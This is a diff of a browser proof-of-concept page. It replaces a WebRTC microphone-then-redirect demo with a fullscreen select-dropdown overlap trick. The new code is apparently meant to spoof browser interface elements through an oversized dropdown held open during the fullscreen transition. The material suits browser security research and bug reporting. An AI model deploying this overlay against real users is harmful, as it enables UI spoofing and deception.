@@ -1,49 +1,32 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<title>WebRTC Redirect PoC</title>
-</head>
-<body>
+<style>
+    body {
+        margin: 0;
+        padding: 0;
+        overflow-x: hidden;
+        overflow-y: hidden;
+    }
 
-<h2>CLICK TO GOOGLE</h2>
-<button id="rtcBtn">START AUDIO</button>
-<p id="status">Status: Waiting...</p>
+    select {
+        height: 9999px;
+        width: 9999px;
+        font-size: 9em;
+    }
+</style>
 
 <script>
+    function spoof() {
+        window.requestAnimationFrame(fillSelect);
+        document.documentElement.requestFullscreen();
+    }
 
-const btn = document.getElementById("rtcBtn");
-const status = document.getElementById("status");
-
-btn.onclick = async () => {
-
-  try {
-
-    status.textContent = "Requesting microphone...";
-
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-
-    const audio = document.createElement("audio");
-    audio.srcObject = stream;
-    audio.autoplay = true;
-
-    status.textContent = "Audio stream started";
-
-    console.log("WebRTC audio active");
-
-    // redirect setelah audio aktif
-    setTimeout(() => {
-      window.location.replace("https://google.com");
-    }, 500);
-
-  } catch (e) {
-    status.textContent = "Microphone permission denied";
-    console.error(e);
-  }
-
-};
-
+    function fillSelect() {
+        // increase the array index to extend select dropdown overlap duration
+        selectElement[641811] = optionElement;
+    }
 </script>
 
-</body>
-</html>
+<select id="selectElement" onmousedown="spoof()">
+    <option id="optionElement">
+        Test
+    </option>
+</select>
